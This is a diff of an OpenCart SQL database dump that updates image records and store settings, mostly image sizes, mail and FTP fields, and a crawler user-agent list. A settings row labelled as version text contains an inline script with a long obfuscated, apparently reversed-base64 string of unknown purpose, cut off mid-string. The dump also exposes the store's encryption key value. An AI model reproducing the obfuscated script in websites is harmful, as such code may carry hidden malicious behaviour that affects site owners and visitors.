+(3, 1, 'Раздел о системах управления ДГУ', '&lt;section class=&quot;white-and-grey-grid product-division&quot;&gt;&lt;h3 class=&quot;section-title&quot; style=&quot;font-family: ''Open Sans'', sans-serif; color: rgb(0, 0, 0);&quot;&gt;&lt;span style=&quot;font-size: 14px; line-height: 20px; background-color: transparent;&quot;&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.&lt;/span&gt;&lt;/h3&gt;&lt;div=&quot;&quot; class=&quot;wide-body-layout&quot;&gt;&lt;div class=&quot;flex-wrapper&quot;&gt;								&lt;/div&gt;					&lt;/div=&quot;&quot;&gt;&lt;/section&gt;', '&lt;section class=&quot;white-and-grey-grid product-division&quot;&gt;			&lt;div class=&quot;wide-body-layout&quot;&gt;				&lt;div class=&quot;flex-wrapper&quot;&gt;					&lt;h3 class=&quot;section-title&quot;&gt;&lt;span style=&quot;font-size: 14px; line-height: 20px; background-color: transparent;&quot;&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.&lt;/span&gt;&lt;br&gt;&lt;/h3&gt;							&lt;/div&gt;		&lt;/div&gt;&lt;/section&gt;', 'Раздел о системах управления ДГУ', 'Раздел о системах управления ДГУ', 'Раздел о системах управления ДГУ', 'Раздел о системах управления ДГУ');
 
 -- --------------------------------------------------------
 
@@ -3223,7 +3237,17 @@ CREATE TABLE IF NOT EXISTS `oc_record_image` (
   `options` text NOT NULL,
   `sort_order` int(3) NOT NULL DEFAULT '0',
   PRIMARY KEY (`record_image_id`)
-) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
+) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=8 ;
+
+--
+-- Дамп данных таблицы `oc_record_image`
+--
+
+INSERT INTO `oc_record_image` (`record_image_id`, `record_id`, `image`, `options`, `sort_order`) VALUES
+(1, 12, 'catalog/logo.png', 'YTo0OntzOjU6InRpdGxlIjthOjM6e2k6MTtzOjA6IiI7aTozO3M6MDoiIjtpOjQ7czowOiIiO31zOjExOiJkZXNjcmlwdGlvbiI7YTozOntpOjE7czowOiIiO2k6MztzOjA6IiI7aTo0O3M6MDoiIjt9czozOiJ1cmwiO2E6Mzp7aToxO3M6MDoiIjtpOjM7czowOiIiO2k6NDtzOjA6IiI7fXM6ODoicmVzZXJ2ZWQiO3M6MDoiIjt9', 0),
+(4, 8, 'catalog/engine-example.jpg', 'YTo0OntzOjU6InRpdGxlIjthOjM6e2k6MTtzOjA6IiI7aTozO3M6MDoiIjtpOjQ7czowOiIiO31zOjExOiJkZXNjcmlwdGlvbiI7YTozOntpOjE7czowOiIiO2k6MztzOjA6IiI7aTo0O3M6MDoiIjt9czozOiJ1cmwiO2E6Mzp7aToxO3M6MDoiIjtpOjM7czowOiIiO2k6NDtzOjA6IiI7fXM6ODoicmVzZXJ2ZWQiO3M6MDoiIjt9', 0),
+(6, 3, 'catalog/engine-example.jpg', 'YTo0OntzOjU6InRpdGxlIjthOjM6e2k6MTtzOjA6IiI7aTozO3M6MDoiIjtpOjQ7czowOiIiO31zOjExOiJkZXNjcmlwdGlvbiI7YTozOntpOjE7czowOiIiO2k6MztzOjA6IiI7aTo0O3M6MDoiIjt9czozOiJ1cmwiO2E6Mzp7aToxO3M6MDoiIjtpOjM7czowOiIiO2k6NDtzOjA6IiI7fXM6ODoicmVzZXJ2ZWQiO3M6MDoiIjt9', 0),
+(7, 2, 'catalog/product1.jpg', 'YTo0OntzOjU6InRpdGxlIjthOjM6e2k6MTtzOjA6IiI7aTozO3M6MDoiIjtpOjQ7czowOiIiO31zOjExOiJkZXNjcmlwdGlvbiI7YTozOntpOjE7czowOiIiO2k6MztzOjA6IiI7aTo0O3M6MDoiIjt9czozOiJ1cmwiO2E6Mzp7aToxO3M6MDoiIjtpOjM7czowOiIiO2k6NDtzOjA6IiI7fXM6ODoicmVzZXJ2ZWQiO3M6MDoiIjt9', 0);
 
 -- --------------------------------------------------------
 
@@ -3571,7 +3595,7 @@ CREATE TABLE IF NOT EXISTS `oc_setting` (
   `value` longtext NOT NULL,
   `serialized` tinyint(1) NOT NULL,
   PRIMARY KEY (`setting_id`)
-) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1285 ;
+) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1642 ;
 
 --
 -- Дамп данных таблицы `oc_setting`
@@ -3605,135 +3629,135 @@ INSERT INTO `oc_setting` (`setting_id`, `store_id`, `code`, `key`, `value`, `ser
 (146, 0, 'category', 'category_status', '1', 0),
 (158, 0, 'account', 'account_status', '1', 0),
 (159, 0, 'affiliate', 'affiliate_status', '1', 0),
-(1011, 0, 'config', 'config_google_captcha_status', '0', 0),
-(1010, 0, 'config', 'config_google_captcha_secret', '', 0),
-(1009, 0, 'config', 'config_google_captcha_public', '', 0),
-(1008, 0, 'config', 'config_google_analytics_status', '0', 0),
-(1007, 0, 'config', 'config_google_analytics', '', 0),
-(1006, 0, 'config', 'config_error_filename', 'error.log', 0),
-(1005, 0, 'config', 'config_error_log', '1', 0),
-(1004, 0, 'config', 'config_error_display', '1', 0),
-(996, 0, 'config', 'config_seo_url', '0', 0),
-(997, 0, 'config', 'config_file_max_size', '300000', 0),
-(998, 0, 'config', 'config_file_ext_allowed', 'zip\r\ntxt\r\npng\r\njpe\r\njpeg\r\njpg\r\ngif\r\nbmp\r\nico\r\ntiff\r\ntif\r\nsvg\r\nsvgz\r\nzip\r\nrar\r\nmsi\r\ncab\r\nmp3\r\nqt\r\nmov\r\npdf\r\npsd\r\nai\r\neps\r\nps\r\ndoc', 0),
-(999, 0, 'config', 'config_file_mime_allowed', 'text/plain\r\nimage/png\r\nimage/jpeg\r\nimage/gif\r\nimage/bmp\r\nimage/tiff\r\nimage/svg+xml\r\napplication/zip\r\n&quot;application/zip&quot;\r\napplication/x-zip\r\n&quot;application/x-zip&quot;\r\napplication/x-zip-compressed\r\n&quot;application/x-zip-compressed&quot;\r\napplication/rar\r\n&quot;application/rar&quot;\r\napplication/x-rar\r\n&quot;application/x-rar&quot;\r\napplication/x-rar-compressed\r\n&quot;application/x-rar-compressed&quot;\r\napplication/octet-stream\r\n&quot;application/octet-stream&quot;\r\naudio/mpeg\r\nvideo/quicktime\r\napplication/pdf', 0),
-(1000, 0, 'config', 'config_maintenance', '', 0),
-(1001, 0, 'config', 'config_password', '1', 0),
-(1002, 0, 'config', 'config_encryption', 'ff6d9b8a3a2581d0caca7cd853fbb6da', 0),
-(1003, 0, 'config', 'config_compression', '0', 0),
+(1626, 0, 'config', 'config_seo_url', '0', 0),
+(1627, 0, 'config', 'config_file_max_size', '300000', 0),
+(1628, 0, 'config', 'config_file_ext_allowed', 'zip\r\ntxt\r\npng\r\njpe\r\njpeg\r\njpg\r\ngif\r\nbmp\r\nico\r\ntiff\r\ntif\r\nsvg\r\nsvgz\r\nzip\r\nrar\r\nmsi\r\ncab\r\nmp3\r\nqt\r\nmov\r\npdf\r\npsd\r\nai\r\neps\r\nps\r\ndoc', 0),
+(1629, 0, 'config', 'config_file_mime_allowed', 'text/plain\r\nimage/png\r\nimage/jpeg\r\nimage/gif\r\nimage/bmp\r\nimage/tiff\r\nimage/svg+xml\r\napplication/zip\r\n&quot;application/zip&quot;\r\napplication/x-zip\r\n&quot;application/x-zip&quot;\r\napplication/x-zip-compressed\r\n&quot;application/x-zip-compressed&quot;\r\napplication/rar\r\n&quot;application/rar&quot;\r\napplication/x-rar\r\n&quot;application/x-rar&quot;\r\napplication/x-rar-compressed\r\n&quot;application/x-rar-compressed&quot;\r\napplication/octet-stream\r\n&quot;application/octet-stream&quot;\r\naudio/mpeg\r\nvideo/quicktime\r\napplication/pdf', 0),
 (94, 0, 'voucher', 'voucher_sort_order', '8', 0),
 (95, 0, 'voucher', 'voucher_status', '1', 0),
 (103, 0, 'free_checkout', 'free_checkout_status', '1', 0),
 (104, 0, 'free_checkout', 'free_checkout_order_status_id', '1', 0),
-(995, 0, 'config', 'config_robots', 'abot\r\ndbot\r\nebot\r\nhbot\r\nkbot\r\nlbot\r\nmbot\r\nnbot\r\nobot\r\npbot\r\nrbot\r\nsbot\r\ntbot\r\nvbot\r\nybot\r\nzbot\r\nbot.\r\nbot/\r\n_bot\r\n.bot\r\n/bot\r\n-bot\r\n:bot\r\n(bot\r\ncrawl\r\nslurp\r\nspider\r\nseek\r\naccoona\r\nacoon\r\nadressendeutschland\r\nah-ha.com\r\nahoy\r\naltavista\r\nananzi\r\nanthill\r\nappie\r\narachnophilia\r\narale\r\naraneo\r\naranha\r\narchitext\r\naretha\r\narks\r\nasterias\r\natlocal\r\natn\r\natomz\r\naugurfind\r\nbackrub\r\nbannana_bot\r\nbaypup\r\nbdfetch\r\nbig brother\r\nbiglotron\r\nbjaaland\r\nblackwidow\r\nblaiz\r\nblog\r\nblo.\r\nbloodhound\r\nboitho\r\nbooch\r\nbradley\r\nbutterfly\r\ncalif\r\ncassandra\r\nccubee\r\ncfetch\r\ncharlotte\r\nchurl\r\ncienciaficcion\r\ncmc\r\ncollective\r\ncomagent\r\ncombine\r\ncomputingsite\r\ncsci\r\ncurl\r\ncusco\r\ndaumoa\r\ndeepindex\r\ndelorie\r\ndepspid\r\ndeweb\r\ndie blinde kuh\r\ndigger\r\nditto\r\ndmoz\r\ndocomo\r\ndownload express\r\ndtaagent\r\ndwcp\r\nebiness\r\nebingbong\r\ne-collector\r\nejupiter\r\nemacs-w3 search engine\r\nesther\r\nevliya celebi\r\nezresult\r\nfalcon\r\nfelix ide\r\nferret\r\nfetchrover\r\nfido\r\nfindlinks\r\nfireball\r\nfish search\r\nfouineur\r\nfunnelweb\r\ngazz\r\ngcreep\r\ngenieknows\r\ngetterroboplus\r\ngeturl\r\nglx\r\ngoforit\r\ngolem\r\ngrabber\r\ngrapnel\r\ngralon\r\ngriffon\r\ngromit\r\ngrub\r\ngulliver\r\nhamahakki\r\nharvest\r\nhavindex\r\nhelix\r\nheritrix\r\nhku www octopus\r\nhomerweb\r\nhtdig\r\nhtml index\r\nhtml_analyzer\r\nhtmlgobble\r\nhubater\r\nhyper-decontextualizer\r\nia_archiver\r\nibm_planetwide\r\nichiro\r\niconsurf\r\niltrovatore\r\nimage.kapsi.net\r\nimagelock\r\nincywincy\r\nindexer\r\ninfobee\r\ninformant\r\ningrid\r\ninktomisearch.com\r\ninspector web\r\nintelliagent\r\ninternet shinchakubin\r\nip3000\r\niron33\r\nisraeli-search\r\nivia\r\njack\r\njakarta\r\njavabee\r\njetbot\r\njumpstation\r\nkatipo\r\nkdd-explorer\r\nkilroy\r\nknowledge\r\nkototoi\r\nkretrieve\r\nlabelgrabber\r\nlachesis\r\nlarbin\r\nlegs\r\nlibwww\r\nlinkalarm\r\nlink validator\r\nlinkscan\r\nlockon\r\nlwp\r\nlycos\r\nmagpie\r\nmantraagent\r\nmapoftheinternet\r\nmarvin/\r\nmattie\r\nmediafox\r\nmediapartners\r\nmercator\r\nmerzscope\r\nmicrosoft url control\r\nminirank\r\nmiva\r\nmj12\r\nmnogosearch\r\nmoget\r\nmonster\r\nmoose\r\nmotor\r\nmultitext\r\nmuncher\r\nmuscatferret\r\nmwd.search\r\nmyweb\r\nnajdi\r\nnameprotect\r\nnationaldirectory\r\nnazilla\r\nncsa beta\r\nnec-meshexplorer\r\nnederland.zoek\r\nnetcarta webmap engine\r\nnetmechanic\r\nnetresearchserver\r\nnetscoop\r\nnewscan-online\r\nnhse\r\nnokia6682/\r\nnomad\r\nnoyona\r\nnutch\r\nnzexplorer\r\nobjectssearch\r\noccam\r\nomni\r\nopen text\r\nopenfind\r\nopenintelligencedata\r\norb search\r\nosis-project\r\npack rat\r\npageboy\r\npagebull\r\npage_verifier\r\npanscient\r\nparasite\r\npartnersite\r\npatric\r\npear.\r\npegasus\r\nperegrinator\r\npgp key agent\r\nphantom\r\nphpdig\r\npicosearch\r\npiltdownman\r\npimptrain\r\npinpoint\r\npioneer\r\npiranha\r\nplumtreewebaccessor\r\npogodak\r\npoirot\r\npompos\r\npoppelsdorf\r\npoppi\r\npopular iconoclast\r\npsycheclone\r\npublisher\r\npython\r\nrambler\r\nraven search\r\nroach\r\nroad runner\r\nroadhouse\r\nrobbie\r\nrobofox\r\nrobozilla\r\nrules\r\nsalty\r\nsbider\r\nscooter\r\nscoutjet\r\nscrubby\r\nsearch.\r\nsearchprocess\r\nsemanticdiscovery\r\nsenrigan\r\nsg-scout\r\nshai''hulud\r\nshark\r\nshopwiki\r\nsidewinder\r\nsift\r\nsilk\r\nsimmany\r\nsite searcher\r\nsite valet\r\nsitetech-rover\r\nskymob.com\r\nsleek\r\nsmartwit\r\nsna-\r\nsnappy\r\nsnooper\r\nsohu\r\nspeedfind\r\nsphere\r\nsphider\r\nspinner\r\nspyder\r\nsteeler/\r\nsuke\r\nsuntek\r\nsupersnooper\r\nsurfnomore\r\nsven\r\nsygol\r\nszukacz\r\ntach black widow\r\ntarantula\r\ntempleton\r\n/teoma\r\nt-h-u-n-d-e-r-s-t-o-n-e\r\ntheophrastus\r\ntitan\r\ntitin\r\ntkwww\r\ntoutatis\r\nt-rex\r\ntutorgig\r\ntwiceler\r\ntwisted\r\nucsd\r\nudmsearch\r\nurl check\r\nupdated\r\nvagabondo\r\nvalkyrie\r\nverticrawl\r\nvictoria\r\nvision-search\r\nvolcano\r\nvoyager/\r\nvoyager-hc\r\nw3c_validator\r\nw3m2\r\nw3mir\r\nwalker\r\nwallpaper\r\nwanderer\r\nwauuu\r\nwavefire\r\nweb core\r\nweb hopper\r\nweb wombat\r\nwebbandit\r\nwebcatcher\r\nwebcopy\r\nwebfoot\r\nweblayers\r\nweblinker\r\nweblog monitor\r\nwebmirror\r\nwebmonkey\r\nwebquest\r\nwebreaper\r\nwebsitepulse\r\nwebsnarf\r\nwebstolperer\r\nwebvac\r\nwebwalk\r\nwebwatch\r\nwebwombat\r\nwebzinger\r\nwhizbang\r\nwhowhere\r\nwild ferret\r\nworldlight\r\nwwwc\r\nwwwster\r\nxenu\r\nxget\r\nxift\r\nxirq\r\nyandex\r\nyanga\r\nyeti\r\nyodao\r\nzao\r\nzippp\r\nzyborg', 0),
-(993, 0, 'config', 'config_secure', '0', 0),
-(994, 0, 'config', 'config_shared', '0', 0),
-(992, 0, 'config', 'config_mail_alert', '', 0),
-(991, 0, 'config', 'config_mail_smtp_timeout', '5', 0),
-(990, 0, 'config', 'config_mail_smtp_port', '25', 0),
-(989, 0, 'config', 'config_mail_smtp_password', '', 0),
-(988, 0, 'config', 'config_mail_smtp_username', '', 0),
-(986, 0, 'config', 'config_mail_parameter', '', 0),
-(987, 0, 'config', 'config_mail_smtp_hostname', '', 0),
-(985, 0, 'config', 'config_mail_protocol', 'mail', 0),
-(984, 0, 'config', 'config_ftp_status', '0', 0),
-(983, 0, 'config', 'config_ftp_root', '', 0),
-(981, 0, 'config', 'config_ftp_username', '', 0),
-(982, 0, 'config', 'config_ftp_password', '', 0),
-(980, 0, 'config', 'config_ftp_port', '21', 0),
-(979, 0, 'config', 'config_ftp_hostname', 'e-shop', 0),
-(978, 0, 'config', 'config_image_location_height', '50', 0),
-(977, 0, 'config', 'config_image_location_width', '268', 0),
-(976, 0, 'config', 'config_image_cart_height', '47', 0),
-(975, 0, 'config', 'config_image_cart_width', '47', 0),
-(974, 0, 'config', 'config_image_wishlist_height', '47', 0),
-(973, 0, 'config', 'config_image_wishlist_width', '47', 0),
-(972, 0, 'config', 'config_image_compare_height', '90', 0),
-(971, 0, 'config', 'config_image_compare_width', '90', 0),
-(970, 0, 'config', 'config_image_related_height', '80', 0),
-(968, 0, 'config', 'config_image_additional_height', '74', 0),
-(969, 0, 'config', 'config_image_related_width', '80', 0),
-(967, 0, 'config', 'config_image_additional_width', '74', 0),
-(966, 0, 'config', 'config_image_product_height', '228', 0),
-(965, 0, 'config', 'config_image_product_width', '228', 0),
-(964, 0, 'config', 'config_image_popup_height', '500', 0),
-(963, 0, 'config', 'config_image_popup_width', '500', 0),
-(962, 0, 'config', 'config_image_thumb_height', '228', 0),
-(961, 0, 'config', 'config_image_thumb_width', '228', 0),
-(960, 0, 'config', 'config_image_category_height', '80', 0),
-(959, 0, 'config', 'config_image_category_width', '80', 0),
-(958, 0, 'config', 'config_icon', 'catalog/cart.png', 0),
-(957, 0, 'config', 'config_logo', 'catalog/logo.png', 0),
-(955, 0, 'config', 'config_return_id', '0', 0),
-(956, 0, 'config', 'config_return_status_id', '2', 0),
-(954, 0, 'config', 'config_affiliate_mail', '0', 0),
-(953, 0, 'config', 'config_affiliate_id', '4', 0),
-(950, 0, 'config', 'config_affiliate_approval', '0', 0),
-(951, 0, 'config', 'config_affiliate_auto', '0', 0),
+(1639, 0, 'config', 'config_google_captcha_public', '', 0),
+(1638, 0, 'config', 'config_google_analytics_status', '0', 0),
+(1637, 0, 'config', 'config_google_analytics', '', 0),
+(1636, 0, 'config', 'config_error_filename', 'error.log', 0),
+(1635, 0, 'config', 'config_error_log', '1', 0),
+(1634, 0, 'config', 'config_error_display', '1', 0),
+(1633, 0, 'config', 'config_compression', '0', 0),
+(1632, 0, 'config', 'config_encryption', 'ff6d9b8a3a2581d0caca7cd853fbb6da', 0),
+(1630, 0, 'config', 'config_maintenance', '', 0),
+(1631, 0, 'config', 'config_password', '1', 0),
+(1623, 0, 'config', 'config_secure', '0', 0),
+(1624, 0, 'config', 'config_shared', '0', 0),
+(1625, 0, 'config', 'config_robots', 'abot\r\ndbot\r\nebot\r\nhbot\r\nkbot\r\nlbot\r\nmbot\r\nnbot\r\nobot\r\npbot\r\nrbot\r\nsbot\r\ntbot\r\nvbot\r\nybot\r\nzbot\r\nbot.\r\nbot/\r\n_bot\r\n.bot\r\n/bot\r\n-bot\r\n:bot\r\n(bot\r\ncrawl\r\nslurp\r\nspider\r\nseek\r\naccoona\r\nacoon\r\nadressendeutschland\r\nah-ha.com\r\nahoy\r\naltavista\r\nananzi\r\nanthill\r\nappie\r\narachnophilia\r\narale\r\naraneo\r\naranha\r\narchitext\r\naretha\r\narks\r\nasterias\r\natlocal\r\natn\r\natomz\r\naugurfind\r\nbackrub\r\nbannana_bot\r\nbaypup\r\nbdfetch\r\nbig brother\r\nbiglotron\r\nbjaaland\r\nblackwidow\r\nblaiz\r\nblog\r\nblo.\r\nbloodhound\r\nboitho\r\nbooch\r\nbradley\r\nbutterfly\r\ncalif\r\ncassandra\r\nccubee\r\ncfetch\r\ncharlotte\r\nchurl\r\ncienciaficcion\r\ncmc\r\ncollective\r\ncomagent\r\ncombine\r\ncomputingsite\r\ncsci\r\ncurl\r\ncusco\r\ndaumoa\r\ndeepindex\r\ndelorie\r\ndepspid\r\ndeweb\r\ndie blinde kuh\r\ndigger\r\nditto\r\ndmoz\r\ndocomo\r\ndownload express\r\ndtaagent\r\ndwcp\r\nebiness\r\nebingbong\r\ne-collector\r\nejupiter\r\nemacs-w3 search engine\r\nesther\r\nevliya celebi\r\nezresult\r\nfalcon\r\nfelix ide\r\nferret\r\nfetchrover\r\nfido\r\nfindlinks\r\nfireball\r\nfish search\r\nfouineur\r\nfunnelweb\r\ngazz\r\ngcreep\r\ngenieknows\r\ngetterroboplus\r\ngeturl\r\nglx\r\ngoforit\r\ngolem\r\ngrabber\r\ngrapnel\r\ngralon\r\ngriffon\r\ngromit\r\ngrub\r\ngulliver\r\nhamahakki\r\nharvest\r\nhavindex\r\nhelix\r\nheritrix\r\nhku www octopus\r\nhomerweb\r\nhtdig\r\nhtml index\r\nhtml_analyzer\r\nhtmlgobble\r\nhubater\r\nhyper-decontextualizer\r\nia_archiver\r\nibm_planetwide\r\nichiro\r\niconsurf\r\niltrovatore\r\nimage.kapsi.net\r\nimagelock\r\nincywincy\r\nindexer\r\ninfobee\r\ninformant\r\ningrid\r\ninktomisearch.com\r\ninspector web\r\nintelliagent\r\ninternet shinchakubin\r\nip3000\r\niron33\r\nisraeli-search\r\nivia\r\njack\r\njakarta\r\njavabee\r\njetbot\r\njumpstation\r\nkatipo\r\nkdd-explorer\r\nkilroy\r\nknowledge\r\nkototoi\r\nkretrieve\r\nlabelgrabber\r\nlachesis\r\nlarbin\r\nlegs\r\nlibwww\r\nlinkalarm\r\nlink validator\r\nlinkscan\r\nlockon\r\nlwp\r\nlycos\r\nmagpie\r\nmantraagent\r\nmapoftheinternet\r\nmarvin/\r\nmattie\r\nmediafox\r\nmediapartners\r\nmercator\r\nmerzscope\r\nmicrosoft url control\r\nminirank\r\nmiva\r\nmj12\r\nmnogosearch\r\nmoget\r\nmonster\r\nmoose\r\nmotor\r\nmultitext\r\nmuncher\r\nmuscatferret\r\nmwd.search\r\nmyweb\r\nnajdi\r\nnameprotect\r\nnationaldirectory\r\nnazilla\r\nncsa beta\r\nnec-meshexplorer\r\nnederland.zoek\r\nnetcarta webmap engine\r\nnetmechanic\r\nnetresearchserver\r\nnetscoop\r\nnewscan-online\r\nnhse\r\nnokia6682/\r\nnomad\r\nnoyona\r\nnutch\r\nnzexplorer\r\nobjectssearch\r\noccam\r\nomni\r\nopen text\r\nopenfind\r\nopenintelligencedata\r\norb search\r\nosis-project\r\npack rat\r\npageboy\r\npagebull\r\npage_verifier\r\npanscient\r\nparasite\r\npartnersite\r\npatric\r\npear.\r\npegasus\r\nperegrinator\r\npgp key agent\r\nphantom\r\nphpdig\r\npicosearch\r\npiltdownman\r\npimptrain\r\npinpoint\r\npioneer\r\npiranha\r\nplumtreewebaccessor\r\npogodak\r\npoirot\r\npompos\r\npoppelsdorf\r\npoppi\r\npopular iconoclast\r\npsycheclone\r\npublisher\r\npython\r\nrambler\r\nraven search\r\nroach\r\nroad runner\r\nroadhouse\r\nrobbie\r\nrobofox\r\nrobozilla\r\nrules\r\nsalty\r\nsbider\r\nscooter\r\nscoutjet\r\nscrubby\r\nsearch.\r\nsearchprocess\r\nsemanticdiscovery\r\nsenrigan\r\nsg-scout\r\nshai''hulud\r\nshark\r\nshopwiki\r\nsidewinder\r\nsift\r\nsilk\r\nsimmany\r\nsite searcher\r\nsite valet\r\nsitetech-rover\r\nskymob.com\r\nsleek\r\nsmartwit\r\nsna-\r\nsnappy\r\nsnooper\r\nsohu\r\nspeedfind\r\nsphere\r\nsphider\r\nspinner\r\nspyder\r\nsteeler/\r\nsuke\r\nsuntek\r\nsupersnooper\r\nsurfnomore\r\nsven\r\nsygol\r\nszukacz\r\ntach black widow\r\ntarantula\r\ntempleton\r\n/teoma\r\nt-h-u-n-d-e-r-s-t-o-n-e\r\ntheophrastus\r\ntitan\r\ntitin\r\ntkwww\r\ntoutatis\r\nt-rex\r\ntutorgig\r\ntwiceler\r\ntwisted\r\nucsd\r\nudmsearch\r\nurl check\r\nupdated\r\nvagabondo\r\nvalkyrie\r\nverticrawl\r\nvictoria\r\nvision-search\r\nvolcano\r\nvoyager/\r\nvoyager-hc\r\nw3c_validator\r\nw3m2\r\nw3mir\r\nwalker\r\nwallpaper\r\nwanderer\r\nwauuu\r\nwavefire\r\nweb core\r\nweb hopper\r\nweb wombat\r\nwebbandit\r\nwebcatcher\r\nwebcopy\r\nwebfoot\r\nweblayers\r\nweblinker\r\nweblog monitor\r\nwebmirror\r\nwebmonkey\r\nwebquest\r\nwebreaper\r\nwebsitepulse\r\nwebsnarf\r\nwebstolperer\r\nwebvac\r\nwebwalk\r\nwebwatch\r\nwebwombat\r\nwebzinger\r\nwhizbang\r\nwhowhere\r\nwild ferret\r\nworldlight\r\nwwwc\r\nwwwster\r\nxenu\r\nxget\r\nxift\r\nxirq\r\nyandex\r\nyanga\r\nyeti\r\nyodao\r\nzao\r\nzippp\r\nzyborg', 0),
+(1622, 0, 'config', 'config_mail_alert', '', 0),
+(1621, 0, 'config', 'config_mail_smtp_timeout', '5', 0),
+(1618, 0, 'config', 'config_mail_smtp_username', '', 0),
+(1619, 0, 'config', 'config_mail_smtp_password', '', 0),
+(1620, 0, 'config', 'config_mail_smtp_port', '25', 0),
+(1617, 0, 'config', 'config_mail_smtp_hostname', '', 0),
+(1616, 0, 'config', 'config_mail_parameter', '', 0),
+(1615, 0, 'config', 'config_mail_protocol', 'mail', 0),
+(1614, 0, 'config', 'config_ftp_status', '0', 0),
+(1613, 0, 'config', 'config_ftp_root', '', 0),
+(1612, 0, 'config', 'config_ftp_password', '', 0),
+(1610, 0, 'config', 'config_ftp_port', '21', 0),
+(1611, 0, 'config', 'config_ftp_username', '', 0),
+(1609, 0, 'config', 'config_ftp_hostname', 'e-shop', 0),
+(1607, 0, 'config', 'config_image_location_width', '268', 0),
+(1608, 0, 'config', 'config_image_location_height', '50', 0),
+(1605, 0, 'config', 'config_image_cart_width', '47', 0),
+(1606, 0, 'config', 'config_image_cart_height', '47', 0),
+(1604, 0, 'config', 'config_image_wishlist_height', '47', 0),
+(1603, 0, 'config', 'config_image_wishlist_width', '47', 0),
+(1602, 0, 'config', 'config_image_compare_height', '90', 0),
+(1601, 0, 'config', 'config_image_compare_width', '90', 0),
+(1599, 0, 'config', 'config_image_related_width', '80', 0),
+(1600, 0, 'config', 'config_image_related_height', '80', 0),
+(1597, 0, 'config', 'config_image_additional_width', '74', 0),
+(1598, 0, 'config', 'config_image_additional_height', '74', 0),
+(1596, 0, 'config', 'config_image_product_height', '228', 0),
+(1595, 0, 'config', 'config_image_product_width', '228', 0),
+(1594, 0, 'config', 'config_image_popup_height', '500', 0),
+(1593, 0, 'config', 'config_image_popup_width', '500', 0),
 (1015, 0, 'ascp_ver', 'ascp_ver_date', '05-03-2016', 0),
 (1016, 0, 'ascp_ver', 'ascp_ver_content', '15.8 PRO | 24.0 TOP | 24.3 TOP 2<script language="javascript" type="text/javascript">var O10=''=oQKpkyJ8dCK0lGbwNnLnUnbl1Gfz12YvV2czIDf05WZ052bjBjM852bpRXYy92YlRGfyVGdmFWQzw3clBXe09FduVWbt92YzIDflRXYylGcflXZrBjM8JXY2lDM8BDMyw3bu9Gd0VnYrJXYtx3dvRmbpdHOywnZlJHaCVDf39GazxHdl5GfhVmchRHelRnMywHduVGdu92Yf9mcwNXbj9WZzxnchRGNxMzXuFmZvVmZzIDflRXYylGcflXZrhjM8NVTDBjM8RWYvxGflhGVyIDfjJ3c0V2Z8xmc1xnYhR3MywXchZGfvZmbpxHdwlmcjN3QzwHdodWaylHcvNGMywHZhVGa8lGchlnclVXcqxXZ0lmc3xnbhZ2blZGfwRHdodjM8VGchN2cl5Wd8xkUVxHc0RHa8xHUPRFMywHfl1WYOdWYUlnQzRnbl1WZsVEdldGfkxWaoNEZuVGcwFGfzVGbpZGfzVGc5R3Xu9Wa0l2cvB3MywHduVWbldmbpJnZulGMywHewFjMwIDflxWdk9WbwIDflJXY3RnZvNHMywXZ2F2cfd2bsJGfjJ3c8Rnbl1WZsVUZ0FWZyNGf0V3bl1WaURXZzBjM8RWZ0FmcpBFMywHa0dmblxGflxWamxXbvNGfr9GftVncvZGdyF2YuVGcvxXM3MjM8BDMwEDMywnZlJHawIDfzBHd0hmMywXZulGbyVGZuVHMywnRxQDM1xHd4VGdwIDfvV2c8B3b0x3ctNGfhN0M8RWZyBjM8JUM0ATd8Vmbv5GMywXehxGczlGZwIDfj9GfklGMywXRxQDM1xHewVjMwIDf0EDNwUHfwADMzAjM8lDN0ATd8JXYkRTMz8lbhZ2blZmMyw3ajFGbiBjM8NjM0ATd89URTBjM8JDNzwHdu9mZyIDf1QDNwUHf0BXayN2c8ZWa5ADflRXYylGc8RXdw5WayIDf0NncpZWQzwXYwIDfzN3YCVDfP90T8xWY2xXZsBnc1B3Xu9Gd0VnY8ZWZyxXZtFmbCVDfu9Wa0Nmb1ZGOywHN0QDM1xHO0QDM1xncvx2bjBjM8N3ZulGd0V2cfB3YzF2NywHZy92YlJ3XsJXdfRmblJUN8VGchN2cl9Ff0h2ZpV2d8ZDN0ATd8dDN0ATd8t2Ypx2Y3IDfuVWZydGMywHdu9mZwIDfyEDNwUHf4B3NxAjM8JXZndWayRHfsFWby9mbwIDf2MDNwUHfJxWS8JXY2xnbhB3cDNDf05WZtV3YvRGfuFGczxXZslHdzBjM8ZEN0ATd8Rnbl52bw12bDlkUVVGZvNmblx3NzQDM1xnQ0QDM1xXR0QDM1x3MzQDM1xXMyQDM1x3QzQDM1xHNzQDM1xHRzQDM1x3M0QDM1xXM0QDM1xXOzQDM1xHflpXazxnclJnclZWZyxXQzQDM1xnciN0M8JzM0ATd8Z0M0ATd8FzM0ATd8NEN0ATd8hjNxwnM0QDM1xHM0QDM1xHMzQDM1xXQwwXNzQDM1xXRzQDM1xHOzQDM1xnQzQDM1xXOwwXZk92QyFGaD12byZGf3Vmb8xWY2VGf0lGbwNHfn5WayR3UvRHf05WSlNnchBHf8BHeFdWZSxXZjFGbwVmc8ZWa8dmbpJHdTxXZslGa3xnbyVHdlJHfu9Wa0Nmb1ZGf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8